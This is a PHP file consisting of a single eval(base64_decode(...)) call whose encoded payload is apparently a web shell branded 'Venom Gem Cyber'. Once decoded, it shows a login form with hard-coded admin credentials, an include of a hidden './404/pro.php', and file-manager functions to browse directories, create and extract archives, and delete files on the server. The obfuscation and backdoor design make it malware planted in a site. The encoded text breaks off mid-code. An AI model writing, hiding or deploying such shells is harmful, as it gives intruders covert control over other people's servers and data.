<?php eval(base64_decode('c2Vzc2lvbl9zdGFydCgpOw0KaW5jbHVkZSAiLi80MDQvcHJvLnBocCI7DQovLyBBdHVyIHBlcmFuIHNlYmFnYWkgYWRtaW4gc2VjYXJhIGRlZmF1bHQNCiRBRE1JTl9VU0VSID0gJ2hhYmliR00nOw0KJEFETUlOX1BBU1MgPSAnSEA4ITgzMjEnOyAvLyBnYW50aSBwYXNzd29yZA0KDQovLyBDZWsgc3RhdHVzIGxvZ2luDQokbG9nZ2VkID0gaXNzZXQoJF9TRVNTSU9OWydnbV9sb2dnZWQxOTkxJ10pICYmICRfU0VTU0lPTlsnZ21fbG9nZ2VkMTk5MSddOw0KDQovLyBMb2cgb3V0DQppZiAoaXNzZXQoJF9HRVRbJ2xvZ291dCddKSkgew0KICAgIHNlc3Npb25fZGVzdHJveSgpOw0KICAgIGhlYWRlcignTG9jYXRpb246ICcgLiBiYXNlbmFtZSgkX1NFUlZFUlsnUEhQX1NFTEYnXSkpOw0KICAgIGV4aXQ7DQp9DQoNCi8vIFRhbmdhbmkgcGVybWludGFhbiBsb2dpbg0KaWYgKGlzc2V0KCRfUE9TVFsnYWN0aW9uJ10pICYmICRfUE9TVFsnYWN0aW9uJ10gPT09ICdsb2dpbicpIHsNCiAgICAkaW5wdXRfdXNlciA9ICRfUE9TVFsndXNlcm5hbWUnXSA/PyAnJzsNCiAgICAkaW5wdXRfcGFzcyA9ICRfUE9TVFsncGFzc3dvcmQnXSA/PyAnJzsNCg0KICAgIC8vIFBlcmlrc2EgVXNlcm5hbWUgREFOIFBhc3N3b3JkDQogICAgaWYgKCRpbnB1dF91c2VyID09PSAkQURNSU5fVVNFUiAmJiAkaW5wdXRfcGFzcyA9PT0gJEFETUlOX1BBU1MpIHsNCiAgICAgICAgJF9TRVNTSU9OWydnbV9sb2dnZWQxOTkxJ10gPSB0cnVlOw0KICAgICAgICBoZWFkZXIoJ0xvY2F0aW9uOiAnIC4gJF9TRVJWRVJbJ1BIUF9TRUxGJ10pOw0KICAgICAgICBleGl0Ow0KICAgIH0gZWxzZSB7DQogICAgICAgICRlcnJvciA9ICJVc2VybmFtZSBhdGF1IFBhc3N3b3JkIHNhbGFoIjsgLy8gUGVzYW4gZXJyb3IgZGlwZXJiYXJ1aQ0KICAgIH0NCn0NCi8vIEppa2EgYmVsdW0gbG9naW4sIGhlbnRpa2FuIGVrc2VrdXNpIGRpIHNpbmkNCmlmICghJGxvZ2dlZCkgew0KICAgIC8vIFRhbXBpbGFuIEhUTUwgdW50dWsgaGFsYW1hbiBsb2dpbg0KICA/Pg0KICAgIDwhRE9DVFlQRSBodG1sPg0KICAgIDxodG1sIGxhbmc9ImlkIj4NCiAgICA8aGVhZD4NCiAgICAgICAgPG1ldGEgY2hhcnNldD0iVVRGLTgiPg0KICAgICAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+DQogICAgICAgIDx0aXRsZT5Mb2dpbiBNYW5hZ2VyIEZpbGU8L3RpdGxlPg0KCQk8bGluayByZWw9Imljb24iIGhyZWY9Ii9mYXZpY29uLmljbyIgdHlwZT0iaW1hZ2UveC1pY29uIj4NCiAgICAgICAgPGxpbmsgaHJlZj0iaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L25wbS9ib290c3RyYXBANS4zLjIvZGlzdC9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiIHJlbD0ic3R5bGVzaGVldCI+DQogICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvZm9udC1hd2Vzb21lLzYuNC4yL2Nzcy9hbGwubWluLmNzcyI+DQogICAgICAgIDxzdHlsZT4NCiAgICAgICAgICAgIGJvZHkgew0KICAgICAgICAgICAgICAgIGJhY2tncm91bmQtaW1hZ2U6IHVybCgnaHR0cHM6Ly9jZG4uZHJpYmJibGUuY29tL3VzZXJ1cGxvYWQvMjc0MzU2NDEvZmlsZS9vcmlnaW5hbC04N2UzY2Q3YjBmOGE5MTU3ZmUyYjJmMTA0MjEyNTNjYi5naWYnKTsNCiAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kLXNpemU6IGNvdmVyOw0KICAgICAgICAgICAgICAgIGJhY2tncm91bmQtcmVwZWF0OiBuby1yZXBlYXQ7DQogICAgICAgICAgICAgICAgYmFja2dyb3VuZC1hdHRhY2htZW50OiBmaXhlZDsNCiAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kLXBvc2l0aW9uOiBjZW50ZXI7DQogICAgICAgICAgICAgICAgY29sb3I6ICNmZmZmZmY7DQogICAgICAgICAgICAgICAgZGlzcGxheTogZmxleDsNCiAgICAgICAgICAgICAgICBmbGV4LWRpcmVjdGlvbjogY29sdW1uOw0KICAgICAgICAgICAgICAgIG1pbi1oZWlnaHQ6IDEwMHZoOw0KICAgICAgICAgICAgICAgIGp1c3RpZnktY29udGVudDogY2VudGVyOw0KICAgICAgICAgICAgICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAubG9naW4tY29udGFpbmVyIHsNCiAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kOiByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMDgpOw0KICAgICAgICAgICAgICAgIGJhY2tkcm9wLWZpbHRlcjogYmx1cigxMHB4KTsNCiAgICAgICAgICAgICAgICBib3JkZXI6IDFweCBzb2xpZCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMTgpOw0KICAgICAgICAgICAgICAgIGJveC1zaGFkb3c6IDAgOHB4IDMycHggMCByZ2JhKDAsIDAsIDAsIDAuMzcpOw0KICAgICAgICAgICAgICAgIHBhZGRpbmc6IDNyZW07DQogICAgICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogMTBweDsNCiAgICAgICAgICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7DQoJCQkJd29yZC1icmVhazogYnJlYWstYWxsOw0KICAgICAgICAgICAgICAgIG92ZXJmbG93LXdyYXA6IGJyZWFrLXdvcmQ7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAuZm9ybS1jb250cm9sLmdlbGFzIHsNCiAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kOiByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMDgpOw0KICAgICAgICAgICAgICAgIGJvcmRlcjogMXB4IHNvbGlkIHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4xOCk7DQogICAgICAgICAgICAgICAgY29sb3I6IHdoaXRlc21va2U7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAuZm9ybS1jb250cm9sLmdlbGFzOjpwbGFjZWhvbGRlciB7DQogICAgICAgICAgICAgICAgY29sb3I6IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC43KTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIC5idG4tcHJpbWFyeSB7DQogICAgICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogI2JjMDA5OTsNCiAgICAgICAgICAgICAgICBib3JkZXItY29sb3I6ICNiYzAwOTk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAuYnRuLXByaW1hcnk6aG92ZXIgew0KICAgICAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICNhMDAwODA7DQogICAgICAgICAgICAgICAgYm9yZGVyLWNvbG9yOiAjYTAwMDgwOw0KICAgICAgICAgICAgfQ0KICAgICAgICA8L3N0eWxlPg0KICAgIDwvaGVhZD4NCiAgICA8Ym9keT4NCiAgICAgICAgPGRpdiBjbGFzcz0ibG9naW4tY29udGFpbmVyIj4NCiAgICAgICAgICAgIDxoMiBjbGFzcz0ibWItNCB0ZXh0LW5vd3JhcCI+VmVub20gR2VtIEN5YmVyPC9oMj4NCiAgICAgICAgICAgIDxmb3JtIG1ldGhvZD0icG9zdCI+DQogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYWN0aW9uIiB2YWx1ZT0ibG9naW4iPg0KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1iLTMiPg0KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idXNlcm5hbWUiIGNsYXNzPSJmb3JtLWNvbnRyb2wgZ2VsYXMiIHBsYWNlaG9sZGVyPSJVc2VybmFtZSIgcmVxdWlyZWQ+DQogICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibWItMyI+DQogICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icGFzc3dvcmQiIGNsYXNzPSJmb3JtLWNvbnRyb2wgZ2VsYXMiIHBsYWNlaG9sZGVyPSJQYXNzd29yZCIgcmVxdWlyZWQ+DQogICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXByaW1hcnkgdy0xMDAiPkxvZ2luPC9idXR0b24+DQogICAgICAgICAgICAgICAgPGJyPg0KICAgICAgICAgICAgICAgIDw/cGhwIGlmICghZW1wdHkoJGVycm9yKSkgZWNobyAnPGRpdiBjbGFzcz0ibXQtMyB0ZXh0LWRhbmdlciI+JyAuIGh0bWxzcGVjaWFsY2hhcnMoJGVycm9yKSAuICc8L2Rpdj4nOyA/Pg0KICAgICAgICAgICAgPC9mb3JtPg0KICAgICAgICA8L2Rpdj4NCiAgICA8L2JvZHk+DQogICAgPC9odG1sPg0KPD9waHANCn0gZWxzZSB7DQovLyBBdHVyIHBlcmFuIHNlYmFnYWkgYWRtaW4gc2VjYXJhIGRlZmF1bHQga2FyZW5hIHRpZGFrIGFkYSBzaXN0ZW0gbG9naW4NCiRpc0FkbWluID0gdHJ1ZTsNCg0KJGRpciA9IGlzc2V0KCRfR0VUWydwYXRoJ10pID8gJF9HRVRbJ3BhdGgnXSA6ICcuLyc7DQppZiAoc3RycG9zKCRkaXIsICcuLicpICE9PSBmYWxzZSkgew0KICAgIGRpZSgiQWtzZXMgdGlkYWsgZGlpemlua2FuLiIpOw0KfQ0KDQovLyBFbnN1cmUgdGhlIGRpcmVjdG9yeSBwYXRoIGVuZHMgd2l0aCBhIHNsYXNoIGZvciBjb25zaXN0ZW5jeQ0KJGRpciA9IHJ0cmltKCRkaXIsICcvJykgLiAnLyc7DQoNCi8vID09PSBOZXcgQUpBWCBIYW5kbGVyIGZvciBWaWV3aW5nIEFyY2hpdmUgQ29udGVudHMgPT09DQppZiAoaXNzZXQoJF9HRVRbJ2FjdGlvbiddKSAmJiAkX0dFVFsnYWN0aW9uJ10gPT09ICd2aWV3X2FyY2hpdmVfY29udGVudHMnICYmIGlzc2V0KCRfR0VUWydmaWxlJ10pKSB7DQogICAgJGZpbGVfbmFtZSA9IGJhc2VuYW1lKCRfR0VUWydmaWxlJ10pOw0KICAgICRmaWxlX3BhdGggPSAkZGlyIC4gJGZpbGVfbmFtZTsNCiAgICAkY29udGVudHMgPSBbXTsNCiAgICAkaXNfc3VjY2VzcyA9IGZhbHNlOw0KDQogICAgaWYgKGZpbGVfZXhpc3RzKCRmaWxlX3BhdGgpICYmIGlzX2ZpbGUoJGZpbGVfcGF0aCkpIHsNCiAgICAgICAgJGV4dGVuc2lvbiA9IHN0cnRvbG93ZXIocGF0aGluZm8oJGZpbGVfbmFtZSwgUEFUSElORk9fRVhURU5TSU9OKSk7DQoNCiAgICAgICAgaWYgKCRleHRlbnNpb24gPT09ICd6aXAnKSB7DQogICAgICAgICAgICAkemlwID0gbmV3IFppcEFyY2hpdmUoKTsNCiAgICAgICAgICAgIGlmICgkemlwLT5vcGVuKCRmaWxlX3BhdGgpID09PSBUUlVFKSB7DQogICAgICAgICAgICAgICAgZm9yICgkaSA9IDA7ICRpIDwgJHppcC0+bnVtRmlsZXM7ICRpKyspIHsNCiAgICAgICAgICAgICAgICAgICAgJHN0YXQgPSAkemlwLT5zdGF0SW5kZXgoJGkpOw0KICAgICAgICAgICAgICAgICAgICAkY29udGVudHNbXSA9IFsNCiAgICAgICAgICAgICAgICAgICAgICAgICduYW1lJyA9PiAkc3RhdFsnbmFtZSddLA0KICAgICAgICAgICAgICAgICAgICAgICAgJ3NpemUnID0+ICRzdGF0WydzaXplJ10NCiAgICAgICAgICAgICAgICAgICAgXTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgJHppcC0+Y2xvc2UoKTsNCiAgICAgICAgICAgICAgICAkaXNfc3VjY2VzcyA9IHRydWU7DQogICAgICAgICAgICB9DQogICAgICAgIH0gZWxzZWlmIChpbl9hcnJheSgkZXh0ZW5zaW9uLCBbJ3RhcicsICdneicsICd0Z3onLCAncGhhciddKSkgew0KICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICAvLyBQaGFyRGF0YSBjYW4gaGFuZGxlIC50YXIsIC50YXIuZ3osIC50Z3osIGFuZCAucGhhcg0KICAgICAgICAgICAgICAgICRwaGFyID0gbmV3IFBoYXJEYXRhKCRmaWxlX3BhdGgpOw0KICAgICAgICAgICAgICAgIGZvcmVhY2ggKG5ldyBSZWN1cnNpdmVJdGVyYXRvckl0ZXJhdG9yKCRwaGFyKSBhcyAkZmlsZSkgew0KICAgICAgICAgICAgICAgICAgICAvLyBHZXQgdGhlIHBhdGggcmVsYXRpdmUgdG8gdGhlIHJvb3Qgb2YgdGhlIGFyY2hpdmUNCiAgICAgICAgICAgICAgICAgICAgJHJlbGF0aXZlUGF0aCA9IHN0cl9yZXBsYWNlKCRwaGFyLT5nZXRQYXRoKCksICcnLCAkZmlsZS0+Z2V0UGF0aG5hbWUoKSk7DQogICAgICAgICAgICAgICAgICAgICRjb250ZW50c1tdID0gWw0KICAgICAgICAgICAgICAgICAgICAgICAgJ25hbWUnID0+IGx0cmltKCRyZWxhdGl2ZVBhdGgsICcvJyksIC8vIENsZWFuIHVwIGxlYWRpbmcgc2xhc2gNCiAgICAgICAgICAgICAgICAgICAgICAgICdzaXplJyA9PiAkZmlsZS0+Z2V0U2l6ZSgpDQogICAgICAgICAgICAgICAgICAgIF07DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICRpc19zdWNjZXNzID0gdHJ1ZTsNCiAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiAkZSkgew0KICAgICAgICAgICAgICAgIC8vIEhhbmRsZSBjYXNlcyB3aGVyZSBQaGFyIGNhbm5vdCBvcGVuIHRoZSBmaWxlDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQoNCiAgICBoZWFkZXIoJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbicpOw0KICAgIGVjaG8ganNvbl9lbmNvZGUoWydzdWNjZXNzJyA9PiAkaXNfc3VjY2VzcywgJ2NvbnRlbnRzJyA9PiAkY29udGVudHNdKTsNCiAgICBleGl0Ow0KfQ0KDQovLyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQovLyBBbGwgb3RoZXIgZXhpc3RpbmcgUEhQIGxvZ2ljIHJlbWFpbnMgYmVsb3cNCi8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCg0KLy8gVGFuZ2FuaSBwZXJtaW50YWFuIGFyc2lwDQppZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICdQT1NUJyAmJiBpc3NldCgkX1BPU1RbJ2FyY2hpdmVfaXRlbXMnXSkpIHsNCiAgICAvLyBQZXJpa3NhIHJvbGUgZGloYXB1cyBrYXJlbmEgZGlhbmdnYXAgc2VsYWx1IGFkbWluDQogICAgLy8gaWYgKCEkaXNBZG1pbikgew0KICAgIC8vIFRhbXBpbGthbiBwZXNhbiBkYW4gYmF0YWxrYW4gYWtzaQ0KICAgIC8vICRtZXNzYWdlID0gIkFrc2VzIGRpdG9sYWsuIEFuZGEgdGlkYWsgbWVtaWxpa2kgaXppbiB1bnR1ayBtZW5nYXJzaXBrYW4gaXRlbS4iOw0KICAgIC8vICRzdGF0dXMgPSAnZGFuZ2VyJzsNCiAgICAvLyBoZWFkZXIoIkxvY2F0aW9uOiAiIC4gYmFzZW5hbWUoJF9TRVJWRVJbJ1BIUF9TRUxGJ10pIC4gIj9wYXRoPSIgLiB1cmxlbmNvZGUoJGRpcikgLiAiJmFsZXJ0X21lc3NhZ2U9IiAuIHVybGVuY29kZSgkbWVzc2FnZSkgLiAiJmFsZXJ0X3N0YXR1cz0iIC4gdXJsZW5jb2RlKCRzdGF0dXMpKTsNCiAgICAvLyBleGl0Ow0KICAgIC8vIH0NCiAgICAkaXRlbXNfdG9fYXJjaGl2ZSA9ICRfUE9TVFsnYXJjaGl2ZV9pdGVtcyddOw0KICAgICRhcmNoaXZlX25hbWUgPSAnYXJjaGl2ZV8nIC4gZGF0ZSgnWW1kX0hpcycpIC4gJy56aXAnOw0KICAgICRhcmNoaXZlX3BhdGggPSAkZGlyIC4gJGFyY2hpdmVfbmFtZTsNCiAgICAkc3RhdHVzID0gJ2Rhbmdlcic7DQogICAgJG1lc3NhZ2UgPSAiR2FnYWwgbWVtYnVhdCBmaWxlIGFyc2lwLiI7DQoNCiAgICAvLyBEYXBhdGthbiBqYWx1ciBhYnNvbHV0IGRhcmkgZGlyZWt0b3JpIHNhYXQgaW5pDQogICAgLy8gaW5pIGFkYWxhaCBrdW5jaSB1bnR1ayBwZXJiYWlrYW4NCiAgICAkY3VycmVudF9kaXJfYWJzID0gcmVhbHBhdGgoJGRpcik7DQoNCiAgICAkemlwID0gbmV3IFppcEFyY2hpdmUoKTsNCiAgICBpZiAoJHppcC0+b3BlbigkYXJjaGl2ZV9wYXRoLCBaaXBBcmNoaXZlOjpDUkVBVEUgfCBaaXBBcmNoaXZlOjpPVkVSV1JJVEUpKSB7DQogICAgICAgIGZvcmVhY2ggKCRpdGVtc190b19hcmNoaXZlIGFzICRpdGVtX25hbWUpIHsNCiAgICAgICAgICAgICRpdGVtX2Z1bGxfcGF0aCA9ICRkaXIgLiBiYXNlbmFtZSgkaXRlbV9uYW1lKTsNCg0KICAgICAgICAgICAgaWYgKGZpbGVfZXhpc3RzKCRpdGVtX2Z1bGxfcGF0aCkpIHsNCiAgICAgICAgICAgICAgICBpZiAoaXNfZmlsZSgkaXRlbV9mdWxsX3BhdGgpKSB7DQogICAgICAgICAgICAgICAgICAgIC8vIEhhbnlhIHRhbWJhaGthbiBmaWxlIGRlbmdhbiBuYW1hIGRhc2FybnlhDQogICAgICAgICAgICAgICAgICAgICR6aXAtPmFkZEZpbGUoJGl0ZW1fZnVsbF9wYXRoLCBiYXNlbmFtZSgkaXRlbV9mdWxsX3BhdGgpKTsNCiAgICAgICAgICAgICAgICB9IGVsc2VpZiAoaXNfZGlyKCRpdGVtX2Z1bGxfcGF0aCkpIHsNCiAgICAgICAgICAgICAgICAgICAgLy8gVGFtYmFoa2FuIGZvbGRlciBzZWNhcmEgcmVrdXJzaWYNCiAgICAgICAgICAgICAgICAgICAgJGZpbGVzID0gbmV3IFJlY3Vyc2l2ZUl0ZXJhdG9ySXRlcmF0b3IoDQogICAgICAgICAgICAgICAgICAgICAgICBuZXcgUmVjdXJzaXZlRGlyZWN0b3J5SXRlcmF0b3IoJGl0ZW1fZnVsbF9wYXRoLCBSZWN1cnNpdmVEaXJlY3RvcnlJdGVyYXRvcjo6U0tJUF9ET1RTKSwNCiAgICAgICAgICAgICAgICAgICAgICAgIFJlY3Vyc2l2ZUl0ZXJhdG9ySXRlcmF0b3I6OlNFTEZfRklSU1QNCiAgICAgICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCAoJGZpbGVzIGFzICRmaWxlKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkcmVhbFBhdGggPSAkZmlsZS0+Z2V0UmVhbFBhdGgoKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIC8vIERhcGF0a2FuIGphbHVyIHJlbGF0aWYgeWFuZyBiZXJzaWggZGVuZ2FuIG1lbW90b25nIGphbHVyIGFic29sdXQgZGlyZWt0b3JpIHNhYXQgaW5pDQogICAgICAgICAgICAgICAgICAgICAgICAkcmVsYXRpdmVQYXRoID0gc3Vic3RyKCRyZWFsUGF0aCwgc3RybGVuKCRjdXJyZW50X2Rpcl9hYnMpICsgMSk7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkZmlsZS0+aXNEaXIoKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICR6aXAtPmFkZEVtcHR5RGlyKCRyZWxhdGl2ZVBhdGgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkemlwLT5hZGRGaWxlKCRyZWFsUGF0aCwgJHJlbGF0aXZlUGF0aCk7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgaWYgKCR6aXAtPmNsb3NlKCkpIHsNCiAgICAgICAgICAgICRtZXNzYWdlID0gIkJlcmhhc2lsIG1lbWJ1YXQgZmlsZSBhcnNpcCAiIC4gaHRtbHNwZWNpYWxjaGFycygkYXJjaGl2ZV9uYW1lKSAuICIuIjsNCiAgICAgICAgICAgICRzdGF0dXMgPSAnc3VjY2Vzcyc7DQogICAgICAgIH0NCiAgICB9DQoNCiAgICBoZWFkZXIoIkxvY2F0aW9uOiAiIC4gYmFzZW5hbWUoJF9TRVJWRVJbJ1BIUF9TRUxGJ10pIC4gIj9wYXRoPSIgLiB1cmxlbmNvZGUoJGRpcikgLiAiJmFsZXJ0X21lc3NhZ2U9IiAuIHVybGVuY29kZSgkbWVzc2FnZSkgLiAiJmFsZXJ0X3N0YXR1cz0iIC4gdXJsZW5jb2RlKCRzdGF0dXMpKTsNCiAgICBleGl0Ow0KfQ0KLy8gRnVuZ3NpIGVrc3RyYWsNCmZ1bmN0aW9uIGV4dHJhY3RBcmNoaXZlKCRhcmNoaXZlUGF0aCwgJGRlc3RpbmF0aW9uKSB7DQogICAgJGV4dGVuc2lvbiA9IHBhdGhpbmZvKCRhcmNoaXZlUGF0aCwgUEFUSElORk9fRVhURU5TSU9OKTsNCiAgICBpZiAoc3RydG9sb3dlcigkZXh0ZW5zaW9uKSA9PT0gJ3ppcCcpIHsNCiAgICAgICAgJGFyY2hpdmUgPSBuZXcgWmlwQXJjaGl2ZTsNCiAgICAgICAgaWYgKCRhcmNoaXZlLT5vcGVuKCRhcmNoaXZlUGF0aCkgPT09IFRSVUUpIHsNCiAgICAgICAgICAgICRhcmNoaXZlLT5leHRyYWN0VG8oJGRlc3RpbmF0aW9uKTsNCiAgICAgICAgICAgICRhcmNoaXZlLT5jbG9zZSgpOw0KICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgIH0NCiAgICB9IGVsc2VpZiAoaW5fYXJyYXkoc3RydG9sb3dlcigkZXh0ZW5zaW9uKSwgWyd0YXInLCAnZ3onLCAndGd6J10pKSB7DQogICAgICAgIHRyeSB7DQogICAgICAgICAgICAkYXJjaGl2ZSA9IG5ldyBQaGFyRGF0YSgkYXJjaGl2ZVBhdGgpOw0KICAgICAgICAgICAgJGFyY2hpdmUtPmV4dHJhY3RUbygkZGVzdGluYXRpb24sIG51bGwsIHRydWUpOw0KICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiAkZSkgew0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgfQ0KICAgIHJldHVybiBmYWxzZTsNCn0NCg0KLy8gVGFuZ2FuaSBwZXJtaW50YWFuIGFyc2lwDQppZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICdQT1NUJyAmJiBpc3NldCgkX1BPU1RbJ2FyY2hpdmVfaXRlbXMnXSkpIHsNCi8vIFBlcmlrc2Egcm9sZSBkaWhhcHVzDQogICAgJGl0ZW1zX3RvX2FyY2hpdmUgPSAkX1BPU1RbJ2FyY2hpdmVfaXRlbXMnXTsNCiAgICAkYXJjaGl2ZV9uYW1lID0gJ2FyY2hpdmVfJyAuIGRhdGUoJ1ltZF9IaXMnKSAuICcuemlwJzsNCiAgICAkYXJjaGl2ZV9wYXRoID0gJGRpciAuICRhcmNoaXZlX25hbWU7DQogICAgJHN0YXR1cyA9ICdkYW5nZXInOw0KICAgICRtZXNzYWdlID0gIkdhZ2FsIG1lbWJ1YXQgZmlsZSBhcnNpcC4iOw0KDQogICAgJHppcCA9IG5ldyBaaXBBcmNoaXZlKCk7DQogICAgaWYgKCR6aXAtPm9wZW4oJGFyY2hpdmVfcGF0aCwgWmlwQXJjaGl2ZTo6Q1JFQVRFIHwgWmlwQXJjaGl2ZTo6T1ZFUldSSVRFKSkgew0KICAgICAgICBmb3JlYWNoICgkaXRlbXNfdG9fYXJjaGl2ZSBhcyAkaXRlbV9uYW1lKSB7DQogICAgICAgICAgICAkaXRlbV9wYXRoID0gJGRpciAuIGJhc2VuYW1lKCRpdGVtX25hbWUpOw0KICAgICAgICAgICAgaWYgKGZpbGVfZXhpc3RzKCRpdGVtX3BhdGgpKSB7DQogICAgICAgICAgICAgICAgaWYgKGlzX2ZpbGUoJGl0ZW1fcGF0aCkpIHsNCiAgICAgICAgICAgICAgICAgICAgLy8gSGFueWEgdGFtYmFoa2FuIGZpbGUgZGVuZ2FuIG5hbWEgZGFzYXINCiAgICAgICAgICAgICAgICAgICAgJHppcC0+YWRkRmlsZSgkaXRlbV9wYXRoLCBiYXNlbmFtZSgkaXRlbV9wYXRoKSk7DQogICAgICAgICAgICAgICAgfSBlbHNlaWYgKGlzX2RpcigkaXRlbV9wYXRoKSkgew0KICAgICAgICAgICAgICAgICAgICAvLyBUYW1iYWhrYW4gZm9sZGVyIHNlY2FyYSByZWt1cnNpZg0KICAgICAgICAgICAgICAgICAgICAkZmlsZXMgPSBuZXcgUmVjdXJzaXZlSXRlcmF0b3JJdGVyYXRvcigNCiAgICAgICAgICAgICAgICAgICAgICAgIG5ldyBSZWN1cnNpdmVEaXJlY3RvcnlJdGVyYXRvcigkaXRlbV9wYXRoLCBSZWN1cnNpdmVEaXJlY3RvcnlJdGVyYXRvcjo6U0tJUF9ET1RTKSwNCiAgICAgICAgICAgICAgICAgICAgICAgIFJlY3Vyc2l2ZUl0ZXJhdG9ySXRlcmF0b3I6OlNFTEZfRklSU1QNCiAgICAgICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgICAgICAgICAgJGJhc2VGb2xkZXIgPSBiYXNlbmFtZSgkaXRlbV9wYXRoKTsNCiAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCAoJGZpbGVzIGFzICRmaWxlKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkcmVhbFBhdGggPSAkZmlsZS0+Z2V0UmVhbFBhdGgoKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIC8vIEJ1YXQgamFsdXIgcmVsYXRpZiB5YW5nIGJlbmFyDQogICAgICAgICAgICAgICAgICAgICAgICAkcmVsYXRpdmVQYXRoID0gJGJhc2VGb2xkZXIgLiAnLycgLiBzdWJzdHIoJHJlYWxQYXRoLCBzdHJsZW4oJGl0ZW1fcGF0aCkgKyAxKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkZmlsZS0+aXNEaXIoKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICR6aXAtPmFkZEVtcHR5RGlyKCRyZWxhdGl2ZVBhdGgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkemlwLT5hZGRGaWxlKCRyZWFsUGF0aCwgJHJlbGF0aXZlUGF0aCk7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgaWYgKCR6aXAtPmNsb3NlKCkpIHsNCiAgICAgICAgICAgICRtZXNzYWdlID0gIkJlcmhhc2lsIG1lbWJ1YXQgZmlsZSBhcnNpcCAiIC4gaHRtbHNwZWNpYWxjaGFycygkYXJjaGl2ZV9uYW1lKSAuICIuIjsNCiAgICAgICAgICAgICRzdGF0dXMgPSAnc3VjY2Vzcyc7DQogICAgICAgIH0NCiAgICB9DQoNCiAgICBoZWFkZXIoIkxvY2F0aW9uOiAiIC4gYmFzZW5hbWUoJF9TRVJWRVJbJ1BIUF9TRUxGJ10pIC4gIj9wYXRoPSIgLiB1cmxlbmNvZGUoJGRpcikgLiAiJmFsZXJ0X21lc3NhZ2U9IiAuIHVybGVuY29kZSgkbWVzc2FnZSkgLiAiJmFsZXJ0X3N0YXR1cz0iIC4gdXJsZW5jb2RlKCRzdGF0dXMpKTsNCiAgICBleGl0Ow0KfQ0KLy8gVGFuZ2FuaSBwZXJtaW50YWFuIHBlbmdoYXB1c2FuIG1hc3NhbA0KaWYgKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddID09PSAnUE9TVCcgJiYgaXNzZXQoJF9QT1NUWydkZWxldGVfaXRlbXMnXSkpIHsN